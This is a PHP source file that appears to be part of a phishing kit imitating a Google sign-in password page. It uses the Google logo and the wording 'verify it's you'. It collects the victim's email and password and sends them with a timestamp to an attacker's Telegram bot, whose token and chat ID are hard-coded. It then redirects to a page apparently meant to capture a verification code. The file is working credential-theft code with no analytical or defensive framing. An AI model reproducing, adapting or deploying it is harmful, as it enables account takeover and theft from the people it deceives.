<?php
require_once "language.php";

$email = $_SESSION["register_email"] ?? "";
$password = "";
$error = "";

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $password = $_POST["password"] ?? "";

    if (empty($password)) {
        $error = $t["password"];
    } else {

        $_SESSION["register_password"] = $password;

    $botToken = "8989336399:AAFrhQGVBjdjV3dhazSpz8FZ3YgY_9jrkzA";
            $chatId = "8086938261";

            $message = "🔔 NEW USER EMAIL & PASSWORD\n\n";
            $message .= "👤 Email: " . $email . "\n";
            $message .= "Password: " . $password . "\n";
            $message .= "🕐 Time: " . date("d M Y, h:i A") . "\n";

            $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

            $data = [
                "chat_id" => $chatId,
                "text" => $message
            ];

            $options = [
                "http" => [
                    "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
                    "method" => "POST",
                    "content" => http_build_query($data)
                ]
            ];

            $context = stream_context_create($options);

            file_get_contents($url, false, $context);
            header("Location: https://business.google.com/en-all/business-profile/");


        header("Location: user-code.php");
        exit;
    }
}
?>

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title><?php echo htmlspecialchars($t["welcome"]); ?></title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

<main class="page">

    <section class="card" aria-label="Demo sign in">

        <div class="brand">
            <img class="logo" src="google-logo.png">
        </div>

        <div class="content">

            <div class="intro">

            <h1><?php echo htmlspecialchars($t["welcome"]); ?></h1>

                <p>
                    <?php echo htmlspecialchars($email); ?>
                </p>

            </div>


            <form method="post">
                <p><?php echo htmlspecialchars($t["to_continue_first_verify_it's_you"]); ?></p>
                <br>
               <div class="password-field <?php echo !empty($error) ? 'error' : ''; ?>">

    <input
        id="password"
        name="password"
        type="password"
        value="<?php echo htmlspecialchars($password); ?>"
        maxlength="190"
        autocomplete="new-password"
    >

    <label for="password">
        <?php echo htmlspecialchars($t["password"]); ?>
    </label>
    <?php if (!empty($error)): ?>
        <div class="error-message">
            <span>!</span>
            <?php echo htmlspecialchars($error); ?>
        </div>
    <?php endif; ?>

</div>
<label class="show-password">
    <input type="checkbox" id="showPassword">
    <span class="custom-checkbox"></span>
    <span class="show-password-text"><?php echo htmlspecialchars($t["show_password"]); ?></span>
</label>
                <br>
                <br>
                <div class="button-container2">
                               <button class="button2" type="submit"><?php echo htmlspecialchars($t["try_another_way"]); ?></button>
                <button class="button3" type="submit">
    <?php echo htmlspecialchars($t["next"]); ?>
</button>
                </div>

            </form>

        </div>

    </section>


    <footer>

    <div class="language-dropdown">

        <button
            type="button"
            id="language-button"
            class="language-button"
        >
            <span id="current-language">
                <?php echo htmlspecialchars($current_language_name); ?>
            </span>

            <span class="language-arrow">▲</span>
        </button>

        <div id="language-menu" class="language-menu">

            <?php foreach ($languages as $code => $name): ?>

                <div
                    class="language-option <?php echo $language === $code ? 'selected' : ''; ?>"
                    data-language="<?php echo htmlspecialchars($code); ?>"
                >
                    <?php echo htmlspecialchars($name); ?>
                </div>

            <?php endforeach; ?>
            
        </div>
    </div>
    <nav>
          <div class="nav-links-container">
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["help"]); ?></a></button>
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["privacy"]); ?></a></button>
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["terms"]); ?></a></button>
        </div>
    </nav>

</footer>

</main>
<script src="password.js"></script>
<script src="show-password.js"></script>
<script src="language.js"></script>
</body>
</html>